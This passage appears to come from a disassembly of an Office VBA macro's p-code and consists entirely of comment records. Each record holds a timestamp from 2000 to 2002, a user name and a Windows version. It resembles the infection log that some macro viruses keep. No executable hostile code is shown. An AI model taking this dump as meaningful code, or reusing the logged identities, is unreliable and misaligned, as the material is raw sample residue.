' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2005:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2006:
' Line #2007:
' Line #2008:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:34:06"
' Line #2009:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2010:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2011:
' Line #2012:
' Line #2013:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:35:46"
' Line #2014:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2015:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2016:
' Line #2017:
' Line #2018:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:35:46"
' Line #2019:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2020:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2021:
' Line #2022:
' Line #2023:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:35:46"
' Line #2024:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2025:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2026:
' Line #2027:
' Line #2028:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:35:47"
' Line #2029:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2030:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2031:
' Line #2032:
' Line #2033:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:35:47"
' Line #2034:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2035:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2036:
' Line #2037:
' Line #2038:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:35:47"
' Line #2039:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2040:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2041:
' Line #2042:
' Line #2043:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:35:48"
' Line #2044:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2045:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2046:
' Line #2047:
' Line #2048:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:41:35"
' Line #2049:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2050:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2051:
' Line #2052:
' Line #2053:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:42:00"
' Line #2054:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2055:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2056:
' Line #2057:
' Line #2058:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:42:22"
' Line #2059:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2060:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2061:
' Line #2062:
' Line #2063:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:43:08"
' Line #2064:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2065:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2066:
' Line #2067:
' Line #2068:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:43:41"
' Line #2069:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2070:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2071:
' Line #2072:
' Line #2073:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:44:06"
' Line #2074:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2075:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2076:
' Line #2077:
' Line #2078:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:44:27"
' Line #2079:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2080:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2081:
' Line #2082:
' Line #2083:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:45:06"
' Line #2084:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2085:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2086:
' Line #2087:
' Line #2088:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:45:23"
' Line #2089:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2090:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2091:
' Line #2092:
' Line #2093:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:45:40"
' Line #2094:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2095:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2096:
' Line #2097:
' Line #2098:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:45:51"
' Line #2099:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2100:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2101:
' Line #2102:
' Line #2103:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:46:12"
' Line #2104:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2105:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2106:
' Line #2107:
' Line #2108:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:51:25"
' Line #2109:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2110:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2111:
' Line #2112:
' Line #2113:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:52:08"
' Line #2114:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2115:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2116:
' Line #2117:
' Line #2118:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:00"
' Line #2119:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2120:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2121:
' Line #2122:
' Line #2123:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:00"
' Line #2124:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2125:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2126:
' Line #2127:
' Line #2128:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:00"
' Line #2129:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2130:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2131:
' Line #2132:
' Line #2133:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:01"
' Line #2134:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2135:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2136:
' Line #2137:
' Line #2138:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:01"
' Line #2139:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2140:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2141:
' Line #2142:
' Line #2143:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:01"
' Line #2144:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2145:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2146:
' Line #2147:
' Line #2148:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:01"
' Line #2149:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2150:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2151:
' Line #2152:
' Line #2153:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:02"
' Line #2154:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2155:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2156:
' Line #2157:
' Line #2158:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:02"
' Line #2159:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2160:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2161:
' Line #2162:
' Line #2163:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:02"
' Line #2164:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2165:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2166:
' Line #2167:
' Line #2168:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:03"
' Line #2169:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2170:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2171:
' Line #2172:
' Line #2173:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:03"
' Line #2174:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2175:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2176:
' Line #2177:
' Line #2178:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:03"
' Line #2179:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2180:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2181:
' Line #2182:
' Line #2183:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:03"
' Line #2184:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2185:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2186:
' Line #2187:
' Line #2188:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:04"
' Line #2189:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2190:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2191:
' Line #2192:
' Line #2193:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:04"
' Line #2194:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2195:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2196:
' Line #2197:
' Line #2198:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:04"
' Line #2199:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2200:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2201:
' Line #2202:
' Line #2203:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:05"
' Line #2204:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2205:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2206:
' Line #2207:
' Line #2208:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:05"
' Line #2209:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2210:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2211:
' Line #2212:
' Line #2213:
' 	QuoteRem 0x0000 0x0013 "13.11.2000 15:53:05"
' Line #2214:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2215:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2216:
' Line #2217:
' Line #2218:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 13:38:14"
' Line #2219:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2220:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2221:
' Line #2222:
' Line #2223:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 13:38:41"
' Line #2224:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2225:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2226:
' Line #2227:
' Line #2228:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 13:40:54"
' Line #2229:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2230:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2231:
' Line #2232:
' Line #2233:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 13:40:54"
' Line #2234:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2235:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2236:
' Line #2237:
' Line #2238:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 15:49:15"
' Line #2239:
' 	QuoteRem 0x0000 0x0003 "trc"
' Line #2240:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2241:
' Line #2242:
' Line #2243:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 15:50:18"
' Line #2244:
' 	QuoteRem 0x0000 0x0003 "trc"
' Line #2245:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2246:
' Line #2247:
' Line #2248:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 15:58:42"
' Line #2249:
' 	QuoteRem 0x0000 0x0003 "trc"
' Line #2250:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2251:
' Line #2252:
' Line #2253:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 16:00:25"
' Line #2254:
' 	QuoteRem 0x0000 0x0003 "trc"
' Line #2255:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2256:
' Line #2257:
' Line #2258:
' 	QuoteRem 0x0000 0x0013 "14.11.2000 18:38:33"
' Line #2259:
' 	QuoteRem 0x0000 0x0003 "kin"
' Line #2260:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2261:
' Line #2262:
' Line #2263:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 13:51:23"
' Line #2264:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2265:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2266:
' Line #2267:
' Line #2268:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 16:25:08"
' Line #2269:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2270:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2271:
' Line #2272:
' Line #2273:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 20:01:50"
' Line #2274:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2275:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2276:
' Line #2277:
' Line #2278:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 20:01:50"
' Line #2279:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2280:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2281:
' Line #2282:
' Line #2283:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 20:01:50"
' Line #2284:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2285:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2286:
' Line #2287:
' Line #2288:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 20:01:51"
' Line #2289:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2290:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2291:
' Line #2292:
' Line #2293:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 20:01:51"
' Line #2294:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2295:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2296:
' Line #2297:
' Line #2298:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 20:01:52"
' Line #2299:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2300:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2301:
' Line #2302:
' Line #2303:
' 	QuoteRem 0x0000 0x0013 "15.11.2000 20:01:52"
' Line #2304:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2305:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2306:
' Line #2307:
' Line #2308:
' 	QuoteRem 0x0000 0x0013 "16.11.2000 14:50:58"
' Line #2309:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2310:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2311:
' Line #2312:
' Line #2313:
' 	QuoteRem 0x0000 0x0013 "16.11.2000 15:19:48"
' Line #2314:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2315:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2316:
' Line #2317:
' Line #2318:
' 	QuoteRem 0x0000 0x0013 "16.11.2000 16:21:02"
' Line #2319:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2320:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2321:
' Line #2322:
' Line #2323:
' 	QuoteRem 0x0000 0x0013 "18.11.2000 13:48:06"
' Line #2324:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2325:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2326:
' Line #2327:
' Line #2328:
' 	QuoteRem 0x0000 0x0013 "18.11.2000 13:48:10"
' Line #2329:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2330:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2331:
' Line #2332:
' Line #2333:
' 	QuoteRem 0x0000 0x0013 "18.11.2000 20:51:33"
' Line #2334:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2335:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2336:
' Line #2337:
' Line #2338:
' 	QuoteRem 0x0000 0x0013 "06.12.2001 16:20:57"
' Line #2339:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2340:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2341:
' Line #2342:
' Line #2343:
' 	QuoteRem 0x0000 0x0013 "16.12.2001 13:04:20"
' Line #2344:
' 	QuoteRem 0x0000 0x0003 "trc"
' Line #2345:
' 	QuoteRem 0x0000 0x0014 "Windows 4.90 Pentium"
' Line #2346:
' Line #2347:
' Line #2348:
' 	QuoteRem 0x0000 0x0013 "19.12.2001 13:35:37"
' Line #2349:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2350:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2351:
' Line #2352:
' Line #2353:
' 	QuoteRem 0x0000 0x0013 "19.12.2001 17:22:42"
' Line #2354:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2355:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2356:
' Line #2357:
' Line #2358:
' 	QuoteRem 0x0000 0x0013 "19.12.2001 17:22:53"
' Line #2359:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2360:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2361:
' Line #2362:
' Line #2363:
' 	QuoteRem 0x0000 0x0013 "19.12.2001 17:25:21"
' Line #2364:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2365:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2366:
' Line #2367:
' Line #2368:
' 	QuoteRem 0x0000 0x0013 "21.12.2001 12:19:15"
' Line #2369:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2370:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2371:
' Line #2372:
' Line #2373:
' 	QuoteRem 0x0000 0x0013 "23.12.2001 21:43:52"
' Line #2374:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2375:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2376:
' Line #2377:
' Line #2378:
' 	QuoteRem 0x0000 0x0013 "25.12.2001 14:39:54"
' Line #2379:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2380:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2381:
' Line #2382:
' Line #2383:
' 	QuoteRem 0x0000 0x0013 "25.12.2001 14:40:32"
' Line #2384:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2385:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2386:
' Line #2387:
' Line #2388:
' 	QuoteRem 0x0000 0x0013 "25.12.2001 14:40:59"
' Line #2389:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2390:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2391:
' Line #2392:
' Line #2393:
' 	QuoteRem 0x0000 0x0013 "25.12.2001 14:41:18"
' Line #2394:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2395:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2396:
' Line #2397:
' Line #2398:
' 	QuoteRem 0x0000 0x0013 "25.12.2001 16:48:46"
' Line #2399:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2400:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2401:
' Line #2402:
' Line #2403:
' 	QuoteRem 0x0000 0x0013 "28.12.2001 14:10:37"
' Line #2404:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2405:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2406:
' Line #2407:
' Line #2408:
' 	QuoteRem 0x0000 0x0013 "28.12.2001 14:11:38"
' Line #2409:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2410:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2411:
' Line #2412:
' Line #2413:
' 	QuoteRem 0x0000 0x0013 "28.12.2001 14:14:32"
' Line #2414:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2415:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2416:
' Line #2417:
' Line #2418:
' 	QuoteRem 0x0000 0x0013 "28.12.2001 16:42:47"
' Line #2419:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2420:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2421:
' Line #2422:
' Line #2423:
' 	QuoteRem 0x0000 0x0013 "29.12.2001 17:49:01"
' Line #2424:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2425:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2426:
' Line #2427:
' Line #2428:
' 	QuoteRem 0x0000 0x0013 "31.12.2001 10:28:53"
' Line #2429:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2430:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2431:
' Line #2432:
' Line #2433:
' 	QuoteRem 0x0000 0x0013 "31.12.2001 14:19:35"
' Line #2434:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2435:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2436:
' Line #2437:
' Line #2438:
' 	QuoteRem 0x0000 0x0013 "31.12.2001 14:21:04"
' Line #2439:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2440:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2441:
' Line #2442:
' Line #2443:
' 	QuoteRem 0x0000 0x0013 "31.12.2001 14:22:28"
' Line #2444:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2445:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2446:
' Line #2447:
' Line #2448:
' 	QuoteRem 0x0000 0x0013 "31.12.2001 14:23:29"
' Line #2449:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2450:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2451:
' Line #2452:
' Line #2453:
' 	QuoteRem 0x0000 0x0013 "31.12.2001 14:25:34"
' Line #2454:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2455:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2456:
' Line #2457:
' Line #2458:
' 	QuoteRem 0x0000 0x0013 "31.12.2001 15:39:11"
' Line #2459:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2460:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2461:
' Line #2462:
' Line #2463:
' 	QuoteRem 0x0000 0x0013 "06.01.2002 17:40:39"
' Line #2464:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2465:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2466:
' Line #2467:
' Line #2468:
' 	QuoteRem 0x0000 0x0013 "06.01.2002 19:06:43"
' Line #2469:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2470:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2471:
' Line #2472:
' Line #2473:
' 	QuoteRem 0x0000 0x0013 "06.01.2002 19:39:31"
' Line #2474:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2475:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2476:
' Line #2477:
' Line #2478:
' 	QuoteRem 0x0000 0x0013 "06.01.2002 19:42:39"
' Line #2479:
' 	QuoteRem 0x0000 0x0007 "adminis"
' Line #2480:
' 	QuoteRem 0x0000 0x0016 "Windows NT 5.0 Pentium"
' Line #2481:
' Line #2482:
' Line #2483:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:01:22"
' Line #2484:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2485:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2486:
' Line #2487:
' Line #2488:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:01:29"
' Line #2489:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2490:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2491:
' Line #2492:
' Line #2493:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:03:44"
' Line #2494:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2495:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2496:
' Line #2497:
' Line #2498:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:10:53"
' Line #2499:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2500:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2501:
' Line #2502:
' Line #2503:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:26:34"
' Line #2504:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2505:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2506:
' Line #2507:
' Line #2508:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:34:58"
' Line #2509:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2510:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2511:
' Line #2512:
' Line #2513:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:36:37"
' Line #2514:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2515:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2516:
' Line #2517:
' Line #2518:
' 	QuoteRem 0x0000 0x0011 "07.01.02 12:46:16"
' Line #2519:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2520:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2521:
' Line #2522:
' Line #2523:
' 	QuoteRem 0x0000 0x0011 "07.01.02 18:59:18"
' Line #2524:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2525:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2526:
' Line #2527:
' Line #2528:
' 	QuoteRem 0x0000 0x0011 "07.01.02 19:08:46"
' Line #2529:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2530:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2531:
' Line #2532:
' Line #2533:
' 	QuoteRem 0x0000 0x0011 "07.01.02 20:50:45"
' Line #2534:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2535:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2536:
' Line #2537:
' Line #2538:
' 	QuoteRem 0x0000 0x0011 "07.01.02 20:52:09"
' Line #2539:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2540:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2541:
' Line #2542:
' Line #2543:
' 	QuoteRem 0x0000 0x0011 "08.01.02 10:43:03"
' Line #2544:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2545:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2546:
' Line #2547:
' Line #2548:
' 	QuoteRem 0x0000 0x0011 "08.01.02 12:30:58"
